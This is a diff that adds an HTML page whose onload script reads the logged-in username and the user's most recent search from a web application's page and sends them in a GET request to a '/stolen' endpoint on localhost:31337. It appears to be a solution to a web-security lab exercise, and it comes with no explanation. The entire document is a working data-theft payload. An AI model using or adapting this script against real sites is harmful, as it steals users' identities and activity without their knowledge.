@@ -1,0 +1,15 @@
+<body onload="main()">
+<script>
+function main() { 
+var pdiv = document.getElementById("history-list"); 
+var linkElement = pdiv.children[1]; 
+var link = linkElement.getAttribute("href"); 
+var search = link.substring(9); console.log(search); 
+var uspan = document.getElementById("logged-in-user"); 
+var username = uspan.innerHTML; console.log(username); 
+var url = "https://localhost:31337/stolen?user=" + username + "&last_search=" + search;
+
+var xml = new XMLHttpRequest(); xml.open("GET", url, false); 
+xml.send(null); 
+};  
+</script>
